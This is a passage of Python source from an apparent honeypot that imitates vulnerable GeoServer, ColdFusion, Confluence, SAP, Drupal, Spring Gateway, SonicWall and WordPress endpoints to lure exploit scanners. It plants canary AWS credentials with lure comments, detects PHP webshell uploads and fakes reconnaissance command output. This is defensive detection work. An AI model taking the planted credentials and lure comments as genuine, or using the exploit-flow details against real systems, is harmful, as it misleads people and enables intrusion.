    <tr><th>Git Revision</th><td>release/{version}</td></tr>
    <tr><th>Build Date</th><td>15-Apr-2024 09:14</td></tr>
    <tr><th>GeoTools Version</th><td>31.1</td></tr>
    <tr><th>GeoWebCache Version</th><td>1.25.1</td></tr>
    <tr><th>Hostname</th><td>{safe_host}</td></tr>
  </table>
  <p>GeoServer is an open-source server for sharing geospatial data.</p>
</body>
</html>
"""
    return body.encode("utf-8")


def render_geoserver_capabilities(service: str, version: str) -> bytes:
    """Minimal OGC GetCapabilities-shaped XML for /ows /wfs /wms /wcs /wps.
    Real capabilities run thousands of lines; scanners typically only sniff
    the root element + ServiceIdentification/Title to confirm the service is
    live before sending the exploit body."""
    svc = (service or "wfs").upper()
    body = f"""<?xml version="1.0" encoding="UTF-8"?>
<{svc}_Capabilities version="2.0.0" xmlns:ows="http://www.opengis.net/ows/1.1" xmlns:xlink="http://www.w3.org/1999/xlink">
  <ows:ServiceIdentification>
    <ows:Title>GeoServer {svc}</ows:Title>
    <ows:Abstract>This is the {svc} service of GeoServer.</ows:Abstract>
    <ows:ServiceType>{svc}</ows:ServiceType>
    <ows:ServiceTypeVersion>2.0.0</ows:ServiceTypeVersion>
  </ows:ServiceIdentification>
  <ows:ServiceProvider>
    <ows:ProviderName>GeoServer</ows:ProviderName>
  </ows:ServiceProvider>
</{svc}_Capabilities>
"""
    return body.encode("utf-8")


def render_coldfusion_public_page(path: str, host: str, version: str) -> bytes:
    title = {
        "/indice.cfm": "Application Index",
        "/menu.cfm": "Application Menu",
        "/base.cfm": "Application Base",
    }.get(path.lower(), "ColdFusion Application")
    safe_host = host or "cfusion.internal"
    body = f"""<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>{title}</title>
  <meta name="generator" content="Adobe ColdFusion {version}" />
</head>
<body>
  <h1>{title}</h1>
  <p>ColdFusion application server on {safe_host}</p>
  <ul>
    <li><a href="/CFIDE/componentutils/">Component Browser</a></li>
    <li><a href="/CFIDE/administrator/index.cfm">ColdFusion Administrator</a></li>
  </ul>
</body>
</html>
"""
    return body.encode("utf-8")


def render_coldfusion_componentutils(host: str, version: str) -> bytes:
    safe_host = host or "cfusion.internal"
    body = f"""<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>ColdFusion Component Browser</title>
  <meta name="generator" content="Adobe ColdFusion {version}" />
</head>
<body>
  <h1>ColdFusion Component Browser</h1>
  <p>Browse components installed on {safe_host}</p>
  <form method="get" action="/CFIDE/componentutils/cfcexplorer.cfc">
    <label>Component path <input name="path" value="cfdocs" /></label>
    <input type="hidden" name="method" value="getcfcinhtml" />
    <button type="submit">Browse</button>
  </form>
  <ul>
    <li><a href="/CFIDE/adminapi/administrator.cfc?method=login">Administrator API</a></li>
    <li><a href="/CFIDE/administrator/index.cfm">ColdFusion Administrator</a></li>
  </ul>
</body>
</html>
"""
    return body.encode("utf-8")


def render_coldfusion_admin_login(host: str, version: str) -> bytes:
    safe_host = host or "cfusion.internal"
    body = f"""<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>ColdFusion Administrator</title>
  <meta name="generator" content="Adobe ColdFusion {version}" />
</head>
<body>
  <h1>ColdFusion Administrator</h1>
  <p>Server: {safe_host}</p>
  <form method="post" action="/CFIDE/administrator/enter.cfm">
    <label>Password <input type="password" name="cfadminPassword" autocomplete="current-password" /></label>
    <input type="hidden" name="requestedURL" value="/CFIDE/administrator/index.cfm" />
    <button type="submit">Login</button>
  </form>
</body>
</html>
"""
    return body.encode("utf-8")


def render_coldfusion_admin_dashboard(host: str, version: str) -> bytes:
    safe_host = host or "cfusion.internal"
    body = f"""<!doctype html>
<html>
<head><meta charset="utf-8" /><title>ColdFusion Administrator</title></head>
<body>
  <h1>ColdFusion Administrator</h1>
  <table>
    <tr><th>Edition</th><td>Enterprise</td></tr>
    <tr><th>Version</th><td>{version}</td></tr>
    <tr><th>Server</th><td>{safe_host}</td></tr>
  </table>
  <ul>
    <li><a href="/CFIDE/administrator/settings/mappings.cfm">Mappings</a></li>
    <li><a href="/CFIDE/administrator/datasources/index.cfm">Data Sources</a></li>
    <li><a href="/CFIDE/adminapi/administrator.cfc?method=getVersion">Admin API</a></li>
  </ul>
</body>
</html>
"""
    return body.encode("utf-8")


def render_coldfusion_adminapi(method_name: str, version: str) -> bytes:
    method = (method_name or "getVersion").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    body = f"""<?xml version="1.0" encoding="UTF-8"?>
<wddxPacket version="1.0">
  <header/>
  <data>
    <struct>
      <var name="method"><string>{method}</string></var>
      <var name="success"><boolean value="true"/></var>
      <var name="version"><string>{version}</string></var>
    </struct>
  </data>
</wddxPacket>
"""
    return body.encode("utf-8")


def render_confluence_login_html(host: str, version: str) -> bytes:
    """Confluence 7.x login page shell. Wicket-aware scanners follow into
    `pages/createpage-entervariables.action` from the page links rendered
    here, so the trap doesn't have to advertise those paths in the body —
    the version banner alone is enough for the canonical CVE-2022-26134
    follow-on probe."""
    safe_host = host or "confluence.internal"
    atl_token = uuid.uuid4().hex
    body = f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="application-name" content="Confluence" />
  <meta name="confluence-base-url" content="https://{safe_host}" />
  <meta name="ajs-version-number" content="{version}" />
  <title>Log in - Confluence</title>
</head>
<body class="aui-page-focused aui-page-size-medium">
  <div id="page">
    <header id="header" role="banner">
      <h1 id="title-text">Log In</h1>
    </header>
    <section id="main" role="main">
      <form name="loginform" id="loginform" method="post" action="/dologin.action" class="aui">
        <input type="hidden" name="atl_token" value="{atl_token}" />
        <input type="hidden" name="os_destination" value="" />
        <input type="hidden" name="login" value="Log in" />
        <fieldset>
          <div class="field-group">
            <label for="os_username">Username</label>
            <input id="os_username" type="text" name="os_username" autocomplete="username" />
          </div>
          <div class="field-group">
            <label for="os_password">Password</label>
            <input id="os_password" type="password" name="os_password" autocomplete="current-password" />
          </div>
          <div class="field-group">
            <input type="checkbox" id="os_cookie" name="os_cookie" value="true" />
            <label for="os_cookie">Remember me</label>
          </div>
          <button type="submit" id="loginButton" name="login" class="aui-button aui-button-primary">Log in</button>
        </fieldset>
      </form>
    </section>
    <footer id="footer" role="contentinfo">
      <small id="footer-build-information">Confluence {version} - {safe_host}</small>
    </footer>
  </div>
</body>
</html>
"""
    return body.encode("utf-8")


def render_confluence_dark_features_json() -> bytes:
    """`/users/user-dark-features` returns a JSON list of feature flags on
    real Confluence — used as a fingerprint by scanners. A small plausible
    array is enough to keep the probe happy without leaking anything
    specific."""
    payload = {
        "siteFeatures": [],
        "userFeatures": [],
    }
    return json.dumps(payload).encode("utf-8")


def render_confluence_editor_preload_html(version: str) -> bytes:
    """`/templates/editor-preload-container` returns the editor template
    HTML. Real responses are a fragment, not a full page; mirroring that
    shape avoids a `not-handled` 404 that would tip off the scanner."""
    body = (
        f'<div class="editor-preload-container" data-version="{version}">'
        f'<div class="content-body"></div>'
        f'</div>'
    )
    return body.encode("utf-8")


def render_sap_metadatauploader_get_error() -> bytes:
    """Bare GET to the Visual Composer servlet — real NetWeaver returns a
    small SAP-formatted error envelope (the servlet only accepts POST in
    production). Mirror that shape so scanners that probe with GET-before-POST
    proceed to send the upload payload."""
    body = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<sap:Error xmlns:sap="urn:sap-com:document:sap:rfc:functions">\n'
        b'  <code>METADATA_UPLOAD_NO_REQUEST</code>\n'
        b'  <message>No multipart request body received.</message>\n'
        b'  <severity>ERROR</severity>\n'
        b'</sap:Error>\n'
    )
    return body


def render_sap_metadatauploader_post_ok(filename: str) -> bytes:
    """Successful POST to the Visual Composer servlet — real NetWeaver
    returns a plaintext receipt with the stored filename. Echoing the
    uploaded filename in the response is what most scanners look for as
    a "shell installed" success indicator; that's enough for them to
    follow up with a GET request to the would-be shell URL, which our
    access log still captures even though no file actually exists."""
    safe = re.sub(r"[^A-Za-z0-9._-]", "_", filename)[:120] or "metadata.xml"
    body = (
        f"OK: stored {safe} in /usr/sap/CE1/J00/j2ee/cluster/apps/sap.com/"
        f"tc~lm~ctc~util/servlet_jsp/tc~lm~ctc~util/root/{safe}\n"
    )
    return body.encode("utf-8")


def render_drupal_user_register_html(version: str, form_build_id: str, form_token: str) -> bytes:
    """Drupal 8/9 user registration form. The CVE-2018-7600 trigger flow
    requires `form_build_id` and `form_token` values in a GET response so
    the AJAX POST that follows is accepted by the form-handling layer.
    Per-hit values prevent the page becoming a cross-sensor fingerprint.

    The page advertises a `Generator` meta tag with the configured
    Drupal version so scanners can fingerprint the build and decide
    whether to ship the Drupalgeddon2 payload."""
    safe_version = re.sub(r"[^0-9.]", "", version)[:24] or "9.5.11"
    return (
        b'<!DOCTYPE html>\n'
        b'<html lang="en" dir="ltr">\n'
        b'<head>\n'
        b'<meta charset="utf-8" />\n'
        b'<meta name="Generator" content="Drupal ' + safe_version.encode("ascii") + b' (https://www.drupal.org)" />\n'
        b'<title>Create new account | Site</title>\n'
        b'<link rel="canonical" href="/user/register" />\n'
        b'</head>\n'
        b'<body class="path-user page-user-register">\n'
        b'<div class="region region-content">\n'
        b'<h1 class="page-title">Create new account</h1>\n'
        b'<form action="/user/register" method="post" id="user-register-form" '
        b'accept-charset="UTF-8" class="user-register-form">\n'
        b'<div class="js-form-item form-item js-form-type-email form-type-email">\n'
        b'<label for="edit-mail" class="js-form-required form-required">Email address</label>\n'
        b'<input type="email" id="edit-mail" name="mail" value="" size="60" maxlength="254" '
        b'class="form-email required" required="required" aria-required="true" />\n'
        b'</div>\n'
        b'<div class="js-form-item form-item js-form-type-textfield form-type-textfield">\n'
        b'<label for="edit-name" class="js-form-required form-required">Username</label>\n'
        b'<input type="text" id="edit-name" name="name" value="" size="60" maxlength="60" '
        b'class="username form-text required" required="required" aria-required="true" />\n'
        b'</div>\n'
        b'<input data-drupal-selector="edit-form-build-id" type="hidden" name="form_build_id" '
        b'value="' + form_build_id.encode("ascii") + b'" />\n'
        b'<input data-drupal-selector="edit-form-token" type="hidden" name="form_token" '
        b'value="' + form_token.encode("ascii") + b'" />\n'
        b'<input data-drupal-selector="edit-form-id" type="hidden" name="form_id" '
        b'value="user_register_form" />\n'
        b'<div class="form-actions js-form-wrapper form-wrapper">\n'
        b'<input type="submit" id="edit-submit" name="op" value="Create new account" '
        b'class="button button--primary js-form-submit form-submit" />\n'
        b'</div>\n'
        b'</form>\n'
        b'</div>\n'
        b'</body>\n'
        b'</html>\n'
    )


def render_drupal_ajax_response() -> bytes:
    """Drupal AJAX form submissions return a JSON array of `command`
    objects (insert / replace / settings / data). A real Drupalgeddon2
    POST that the form pipeline accepts produces a minimal-valid AJAX
    envelope; mirroring it keeps scanners from bailing on a malformed
    response. We deliberately do NOT echo any submitted form field —
    flux's response body must not ship attacker-controlled tokens that
    a downstream log pipeline might re-render unsafely."""
    payload = [
        {
            "command": "insert",
            "method": "replaceWith",
            "selector": "#user-register-form",
            "data": "<div class=\"messages messages--status\">"
                    "Further instructions have been sent to your email address.</div>",
            "settings": None,
        },
    ]
    return (json.dumps(payload) + "\n").encode("utf-8")


def render_drupal_settings_php(r: dict[str, object]) -> bytes:
    """Drupal 8/9 `sites/default/settings.php`. Real installations carry
    `$databases['default']['default']` arrays with plaintext DB creds,
    plus `$settings['hash_salt']` and `$config_directories` lines that
    scanners grep for as fingerprint markers. The S3-backup block at
    the bottom ships a Tracebit AWS canary; the DB password is per-hit
    synthetic (no fixed literals)."""
    aws = _aws(r)
    db_password = _fake_db_password()
    hash_salt = secrets.token_urlsafe(43)
    config_sync_dir = secrets.token_hex(20)
    return (
        "<?php\n"
        "/**\n"
        " * @file\n"
        " * Drupal site-specific configuration file.\n"
        " */\n"
        "\n"
        "$databases['default']['default'] = [\n"
        "  'database' => 'drupal_prod',\n"
        "  'username' => 'drupal_app',\n"
        f"  'password' => '{db_password}',\n"
        "  'prefix' => '',\n"
        "  'host' => 'db.internal',\n"
        "  'port' => '3306',\n"
        "  'namespace' => 'Drupal\\\\Core\\\\Database\\\\Driver\\\\mysql',\n"
        "  'driver' => 'mysql',\n"
        "];\n"
        "\n"
        f"$settings['hash_salt'] = '{hash_salt}';\n"
        "$settings['update_free_access'] = FALSE;\n"
        "$settings['file_public_path'] = 'sites/default/files';\n"
        f"$settings['config_sync_directory'] = 'sites/default/files/config_{config_sync_dir}/sync';\n"
        "$settings['trusted_host_patterns'] = ['^.+$'];\n"
        "\n"
        "// S3 backup credentials — rotated nightly by ops/backup-cron.\n"
        "// Replay against AWS STS for verification before rotation.\n"
        f"$config['s3fs.settings']['access_key'] = '{aws.get('awsAccessKeyId', '')}';\n"
        f"$config['s3fs.settings']['secret_key'] = '{aws.get('awsSecretAccessKey', '')}';\n"
        f"$config['s3fs.settings']['session_token'] = '{aws.get('awsSessionToken', '')}';\n"
        "$config['s3fs.settings']['region'] = 'us-east-1';\n"
        "$config['s3fs.settings']['bucket'] = 'drupal-backups-prod';\n"
        "\n"
        "if (file_exists($app_root . '/' . $site_path . '/settings.local.php')) {\n"
        "  include $app_root . '/' . $site_path . '/settings.local.php';\n"
        "}\n"
    ).encode("utf-8")


def render_spring_gateway_routes_get(r: dict[str, object]) -> bytes:
    """Spring Cloud Gateway `/actuator/gateway/routes` returns the
    current route list. Real responses are a JSON array of objects
    keyed by `route_id`, with `predicate` + `filters` + `uri` +
    `metadata` fields. We ship a small fake table whose `metadata`
    slot includes a Tracebit AWS access-key id — a credential
    harvester that greps the response body for `AKIA` walks away with
    a replay-fireable key. The `/admin-internal/**` route hints at
    further admin surface for the scanner to probe."""
    aws = _aws(r)
    ak = aws.get("awsAccessKeyId", "")
    sk = aws.get("awsSecretAccessKey", "")
    payload = [
        {
            "route_id": "admin-internal-proxy",
            "route_definition": {
                "id": "admin-internal-proxy",
                "predicates": [
                    {"name": "Path", "args": {"_genkey_0": "/admin-internal/**"}},
                ],
                "filters": [
                    {"name": "AddRequestHeader", "args": {
                        "name": "X-Admin-Api-Key",
                        "value": ak,
                    }},
                ],
                "uri": "http://admin.internal:8080",
                "order": 0,
                "metadata": {
                    "adminApiKey": ak,
                    "adminApiSecret": sk,
                },
            },
            "order": 0,
        },
        {
            "route_id": "public-static-proxy",
            "route_definition": {
                "id": "public-static-proxy",
                "predicates": [
                    {"name": "Path", "args": {"_genkey_0": "/static/**"}},
                ],
                "filters": [],
                "uri": "http://static.internal:8080",
                "order": 10,
                "metadata": {},
            },
            "order": 10,
        },
    ]
    return (json.dumps(payload, indent=2) + "\n").encode("utf-8")


def render_spring_gateway_route_created(route_id: str) -> bytes:
    """Successful POST to `/actuator/gateway/routes/{id}` — real Spring
    Cloud Gateway returns 201 Created with an empty body. Some
    deployments emit a JSON envelope confirming the route id; ship that
    shape so scanners that parse the response know which `/refresh`
    call to issue next. Sanitise the echoed id to prevent attacker
    bytes from landing in flux's response."""
    safe_id = re.sub(r"[^A-Za-z0-9._-]", "_", route_id)[:120] or "route"
    return (json.dumps({"id": safe_id, "status": "created"}) + "\n").encode("utf-8")


def render_spring_gateway_refresh_ok() -> bytes:
    """`POST /actuator/gateway/refresh` returns an empty body with a
    200 OK on real Spring Cloud Gateway. Empty body is the documented
    shape; scanners checking for refresh success look at the status
    code, not the body."""
    return b""


def render_spring_gateway_global_filters() -> bytes:
    """`GET /actuator/gateway/globalfilters` returns the configured
    GlobalFilter chain with order. Plausible default values from a
    stock Spring Cloud Gateway 3.1.x install — keeps scanners chasing
    the routes endpoint instead of bailing on a 404."""
    payload = {
        "org.springframework.cloud.gateway.filter.ForwardRoutingFilter@1": 2147483647,
        "org.springframework.cloud.gateway.filter.NettyRoutingFilter@1": 2147483646,
        "org.springframework.cloud.gateway.filter.ForwardPathFilter@1": 0,
        "org.springframework.cloud.gateway.filter.RouteToRequestUrlFilter@1": 10000,
        "org.springframework.cloud.gateway.filter.LoadBalancerClientFilter@1": 10100,
        "org.springframework.cloud.gateway.filter.WebsocketRoutingFilter@1": 2147483646,
    }
    return (json.dumps(payload, indent=2) + "\n").encode("utf-8")


def render_sonicwall_is_sslvpn_enabled() -> bytes:
    # SonicOS 7 returns a status envelope alongside the boolean. Field names
    # match the documented shape; values are the defaults a live appliance
    # with SSL VPN turned on would emit.
    payload = {
        "is_ssl_vpn_enabled": True,
        "status": {
            "success": True,
            "cli_msg": "",
            "info": [{"level": "info", "code": "E_OK", "message": ""}],
        },
    }
    return json.dumps(payload).encode("utf-8")


def render_sonicwall_auth_success(session_id: str) -> bytes:
    # Minimum-plausible SonicOS auth success: a status envelope, a session
    # token echoed back (so the scanner thinks it has a live session), and a
    # nonce field the CVE-2024-53704 exploit chain reads.
    payload = {
        "status": {
            "success": True,
            "cli_msg": "Login succeeded",
            "info": [{"level": "info", "code": "E_OK", "message": "authenticated"}],
        },
        "auth": {
            "session_id": session_id,
            "user_name": "admin",
            "tfa_required": True,
            "tfa_method": "totp",
        },
    }
    return json.dumps(payload).encode("utf-8")


def render_sonicwall_tfa_success(session_id: str) -> bytes:
    # Mirror the auth response shape; TFA success collapses the `tfa_required`
    # flag to false so the exploit moves on to whatever it does post-auth.
    payload = {
        "status": {
            "success": True,
            "cli_msg": "TFA accepted",
            "info": [{"level": "info", "code": "E_OK", "message": "tfa-accepted"}],
        },
        "auth": {
            "session_id": session_id,
            "user_name": "admin",
            "tfa_required": False,
        },
    }
    return json.dumps(payload).encode("utf-8")


# --- Web-app form responder renderer -------------------------------------
def render_webapp_form_html(
    *,
    suffix: str,
    path: str,
    csrf_token: str,
) -> bytes:
    """Plausible HTML form for a generic web app. Posts back to the same
    path so the credential-stuffing scanner's next request lands on the
    same handler. Field names match the most common name= attributes seen
    in the wild — `username`, `email`, `password` — so naive form-fillers
    bind cleanly without needing to inspect the markup."""
    if suffix == "signup":
        title = "Create your account"
        submit = "Sign up"
        extra_field = (
            '<label for="email">Email</label>'
            '<input id="email" name="email" type="email" autocomplete="email" required />'
        )
    elif suffix == "checkout":
        title = "Checkout"
        submit = "Continue to payment"
        extra_field = (
            '<label for="email">Email</label>'
            '<input id="email" name="email" type="email" autocomplete="email" required />'
        )
    elif suffix == "contact":
        title = "Contact us"
        submit = "Send"
        extra_field = (
            '<label for="email">Email</label>'
            '<input id="email" name="email" type="email" autocomplete="email" required />'
            '<label for="message">Message</label>'
            '<textarea id="message" name="message" rows="4"></textarea>'
        )
    elif suffix == "profile":
        title = "Account settings"
        submit = "Save changes"
        extra_field = (
            '<label for="email">Email</label>'
            '<input id="email" name="email" type="email" autocomplete="email" />'
        )
    else:  # login + form fallback
        title = "Sign in"
        submit = "Sign in"
        extra_field = ""
    safe_path = path.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
    safe_token = csrf_token.replace("&", "&amp;").replace('"', "&quot;")
    body = f"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>{title}</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
<main>
<h1>{title}</h1>
<form method="POST" action="{safe_path}" autocomplete="on">
<input type="hidden" name="csrf_token" value="{safe_token}" />
{extra_field}
<label for="username">Username</label>
<input id="username" name="username" type="text" autocomplete="username" required />
<label for="password">Password</label>
<input id="password" name="password" type="password" autocomplete="current-password" required />
<button type="submit">{submit}</button>
</form>
</main>
</body>
</html>
"""
    return body.encode("utf-8")


# --- WordPress wp-login.php canary renderer + nonce cache -----------------

_WP_LOGIN_NONCE_CACHE: dict[str, tuple[float, set[str]]] = {}


def _wp_login_nonce_store(client_ip: str, nonce: str) -> None:
    now = time.monotonic()
    entry = _WP_LOGIN_NONCE_CACHE.get(client_ip)
    if entry and entry[0] > now:
        entry[1].add(nonce)
        if len(entry[1]) > 32:
            entry[1].pop()
    else:
        _WP_LOGIN_NONCE_CACHE[client_ip] = (now + WP_LOGIN_NONCE_CACHE_TTL, {nonce})
    if len(_WP_LOGIN_NONCE_CACHE) > WP_LOGIN_NONCE_CACHE_MAX:
        expired = [k for k, v in _WP_LOGIN_NONCE_CACHE.items() if v[0] <= now]
        for k in expired:
            del _WP_LOGIN_NONCE_CACHE[k]
        if len(_WP_LOGIN_NONCE_CACHE) > WP_LOGIN_NONCE_CACHE_MAX:
            oldest_key = min(_WP_LOGIN_NONCE_CACHE, key=lambda k: _WP_LOGIN_NONCE_CACHE[k][0])
            del _WP_LOGIN_NONCE_CACHE[oldest_key]


def _wp_login_nonce_check(client_ip: str, nonce: str) -> bool:
    now = time.monotonic()
    entry = _WP_LOGIN_NONCE_CACHE.get(client_ip)
    if not entry or entry[0] <= now:
        return False
    return nonce in entry[1]


def render_wp_login_html(*, nonce: str, redirect_to: str) -> bytes:
    safe_nonce = nonce.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
    safe_redirect = redirect_to.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
    body = f"""<!DOCTYPE html>
<html lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Log In &lsaquo; WordPress</title>
<meta name="robots" content="max-image-preview:large, noindex, noarchive" />
<meta name="viewport" content="width=device-width" />
</head>
<body class="login login-action-login wp-core-ui">
<div id="login">
<h1><a href="https://wordpress.org/">Powered by WordPress</a></h1>
<form name="loginform" id="loginform" action="/wp-login.php" method="post">
<p>
<label for="user_login">Username or Email Address</label>
<input type="text" name="log" id="user_login" class="input" value="" size="20" autocapitalize="off" autocomplete="username" required="required" />
</p>
<p>
<label for="user_pass">Password</label>
<input type="password" name="pwd" id="user_pass" class="input" value="" size="20" autocomplete="current-password" spellcheck="false" required="required" />
</p>
<p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever" /> <label for="rememberme">Remember Me</label></p>
<p class="submit">
<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
<input type="hidden" name="redirect_to" value="{safe_redirect}" />
<input type="hidden" name="testcookie" value="1" />
<input type="hidden" name="_wpnonce" value="{safe_nonce}" />
</p>
</form>
<p id="nav"><a href="/wp-login.php?action=lostpassword">Lost your password?</a></p>
</div>
</body>
</html>
"""
    return body.encode("utf-8")


def extract_wp_login_creds(body: bytes, content_type: str) -> dict[str, str]:
    parsed = parse_form_body(body, content_type)
    result: dict[str, str] = {}
    for key in ("log", "pwd", "wp-submit", "redirect_to", "testcookie", "_wpnonce", "rememberme"):
        values = parsed.get(key)
        if values and values[0]:
            if key == "pwd":
                result["hasPwd"] = "true"
            else:
                result[key] = values[0][:200]
    return result


# Multipart Content-Disposition header tokens used by file-upload trap.
# Tokens we care about: name="..." and filename="..." (or unquoted). Match
# is anchored to the raw bytes of a multipart part and is permissive about
# quoting because exploit clients vary.
_MULTIPART_NAME_RE = re.compile(
    rb'(?i)name\s*=\s*(?:"([^"]*)"|([^;\r\n]+))',
)
_MULTIPART_FILENAME_RE = re.compile(
    rb'(?i)filename\s*=\s*(?:"([^"]*)"|([^;\r\n]+))',
)
_MULTIPART_CONTENT_TYPE_RE = re.compile(
    rb'(?im)^\s*Content-Type\s*:\s*([^\r\n;]+)',
)


def extract_multipart_parts(
    body: bytes,
    content_type: str,
    max_parts: int,
) -> tuple[list[str], list[str], list[str], bool]:
    """Parse a `multipart/form-data` body well enough to extract:

    - field names (`name="..."`)
    - uploaded filenames (`filename="..."` — empty/absent means a plain field, not a file)
    - per-part Content-Type values
    - whether any part contains a PHP-shell indicator

    Returns ``(names, filenames, content_types, has_php_shell)``.

    Stops at `max_parts` parts. Stdlib-only: no `email.parser` dependency
    on the wire-shape, since exploit clients commonly emit slightly
    malformed multipart bodies that `email` rejects. We split on the
    boundary token from the Content-Type header and read the
    per-part header block via regex on the raw bytes.
    """
    if not body:
        return [], [], [], False
    ct_raw = content_type or ""
    ct_low = ct_raw.lower()
    if "multipart/form-data" not in ct_low or "boundary=" not in ct_low:
        return [], [], [], False
    # Find the boundary in the original-case header — boundary values are
    # case-sensitive, so we must not lowercase before extraction.
    boundary_start = ct_low.index("boundary=") + len("boundary=")
    boundary = ct_raw[boundary_start:].split(";", 1)[0].strip()
    # RFC 7578 permits a quoted boundary; strip surrounding quotes if present.
    if boundary.startswith('"') and boundary.endswith('"') and len(boundary) >= 2:
        boundary = boundary[1:-1]
    if not boundary:
        return [], [], [], False
    sep = b"--" + boundary.encode("latin-1", errors="replace")
    raw_parts = body.split(sep)
    # First element is the preamble (usually empty), last is the epilogue or
    # `--\r\n` end marker — neither is a real part.
    names: list[str] = []
    filenames: list[str] = []
    content_types: list[str] = []
    has_php_shell = False
    for chunk in raw_parts[1:1 + max_parts]:
        if not chunk or chunk[:2] == b"--":
            # Either the epilogue or the closing `--` after the final boundary.
            continue
        # Each part begins with CRLF (per RFC) — strip the leading newline so
        # the header regexes can match from the start. Tolerate LF-only.
        if chunk[:2] == b"\r\n":
            chunk = chunk[2:]
        elif chunk[:1] == b"\n":
            chunk = chunk[1:]
        header_end = chunk.find(b"\r\n\r\n")
        if header_end == -1:
            header_end = chunk.find(b"\n\n")
            if header_end == -1:
                # Malformed part — record its presence but skip extraction.
                continue
            part_headers = chunk[:header_end]
            part_body = chunk[header_end + 2:]
        else:
            part_headers = chunk[:header_end]
            part_body = chunk[header_end + 4:]
        m_name = _MULTIPART_NAME_RE.search(part_headers)
        if m_name:
            name_bytes = (m_name.group(1) or m_name.group(2) or b"").strip()
            names.append(name_bytes.decode("utf-8", errors="replace")[:120])
        m_filename = _MULTIPART_FILENAME_RE.search(part_headers)
        if m_filename:
            fn_bytes = (m_filename.group(1) or m_filename.group(2) or b"").strip()
            # An empty filename="" means "no file submitted for this field" —
            # we still record the field name above but skip the filename list.
            if fn_bytes:
                filenames.append(fn_bytes.decode("utf-8", errors="replace")[:240])
        m_ct = _MULTIPART_CONTENT_TYPE_RE.search(part_headers)
        if m_ct:
            ct_value = m_ct.group(1).strip()
            content_types.append(ct_value.decode("latin-1", errors="replace")[:120])
        if not has_php_shell:
            lowered_body = part_body.lower()
            for needle in _FILE_UPLOAD_PHP_SHELL_INDICATORS:
                if needle in lowered_body:
                    has_php_shell = True
                    break
    return names, filenames, content_types, has_php_shell


def extract_webapp_form_creds(body: bytes, content_type: str) -> tuple[str, bool, bool, list[str]]:
    """Pull (username, has_password, has_email, field_names) out of a form
    body. Accepts both `application/x-www-form-urlencoded` (the dominant
    shape from credential-stuffing tooling) and `application/json`
    (occasional API-style POST). Username value is capped at 120 chars;
    password value is never returned, only its presence."""
    username = ""
    has_password = False
    has_email = False
    field_names: list[str] = []
    if not body:
        return username, has_password, has_email, field_names
    ct = (content_type or "").split(";", 1)[0].strip().lower()
    parsed: dict[str, list[str]] = {}
    if ct in {"application/x-www-form-urlencoded", ""}:
        parsed = parse_form_body(body, content_type)
    elif ct == "application/json":
        try:
            obj = json.loads(body.decode("utf-8", errors="replace"))
        except (UnicodeDecodeError, json.JSONDecodeError):
            obj = None
        if isinstance(obj, dict):
            for k, v in obj.items():
                if isinstance(v, (str, int, float, bool)):
                    parsed[str(k)] = [str(v)]
    field_names = sorted({str(k) for k in parsed.keys()})[:32]
    for key in WEBAPP_FORM_USERNAME_KEYS:
        for candidate in (key, key.upper()):
            values = parsed.get(candidate)
            if values and values[0]:
                username = str(values[0])[:120]
                break
        if username:
            break
    has_password = any(
        bool((parsed.get(key) or parsed.get(key.upper()) or [""])[0])
        for key in WEBAPP_FORM_PASSWORD_KEYS
    )
    has_email = any(
        "@" in str((parsed.get(key) or parsed.get(key.upper()) or [""])[0])
        for key in ("email", "user_email", "e_mail", "mail")
    )
    if not has_email and username and "@" in username:
        has_email = True
    return username, has_password, has_email, field_names


def parse_cookies(cookie_header: str) -> dict[str, str]:
    cookies: dict[str, str] = {}
    if not cookie_header:
        return cookies
    for part in cookie_header.split(";"):
        part = part.strip()
        if not part or "=" not in part:
            continue
        name, _, value = part.partition("=")
        cookies[name.strip()] = value.strip()
    return cookies


def parse_form_body(body_bytes: bytes, content_type: str) -> dict[str, list[str]]:
    if not body_bytes:
        return {}
    ct = (content_type or "").split(";", 1)[0].strip().lower()
    if ct not in {"application/x-www-form-urlencoded", ""}:
        return {}
    try:
        text = body_bytes.decode("utf-8", errors="replace")
    except UnicodeDecodeError:
        return {}
    return parse_qs(text, keep_blank_values=True)


def extract_webshell_command(
    query_params: dict[str, list[str]],
    form_params: dict[str, list[str]],
    cookies: dict[str, str],
    headers: object,
) -> tuple[str, str, str]:
    """Return (source, key, command). source='' means no command found."""
    for source, collection in (("query", query_params), ("form", form_params)):
        for key in WEBSHELL_COMMAND_KEYS:
            for candidate in (key, key.upper()):
                values = collection.get(candidate)
                if values and values[0]:
                    return source, candidate, values[0]
    for key in WEBSHELL_COMMAND_KEYS:
        if key in cookies and cookies[key]:
            return "cookie", key, cookies[key]
    for header_name in WEBSHELL_COMMAND_HEADERS:
        value = headers.get(header_name)
        if value:
            return "header", header_name, value
    return "", "", ""


def simulate_command_output(command: str) -> str:
    """Return plausible fake output for common reconnaissance commands.

    The goal is to look convincing enough that a scanner moves on to its next
    command instead of bailing after the first probe. Unknown commands return
    an empty string (which many shells produce for assignments, `cd`, etc.)
    so we don't leak "it's fake" via a canned error message.
    """
    cmd = command.strip()
    if not cmd:
        return ""
    first = cmd.split(None, 1)[0].lower().lstrip("!")
    if first in {"id"}:
        return "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
    if first in {"whoami"}:
        return "www-data\n"
    if first in {"hostname"}:
        return "web-01\n"
    if first in {"pwd"}:
        return "/var/www/html/wp-content/plugins/hellopress\n"
    if cmd in {"uname", "uname -a", "uname -r"}:
        return "Linux web-01 5.15.0-86-generic #96-Ubuntu SMP Wed Sep 20 08:23:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\n"
